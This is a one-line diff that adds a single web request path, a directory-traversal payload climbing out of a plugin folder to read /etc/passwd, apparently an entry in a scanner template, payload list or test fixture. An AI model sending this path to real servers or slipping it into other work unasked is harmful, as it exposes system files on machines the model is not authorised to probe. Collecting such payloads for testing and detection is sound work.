@@ -1,0 +1,1 @@
+/public/plugins/welcome/../../../../../../../../etc/passwd
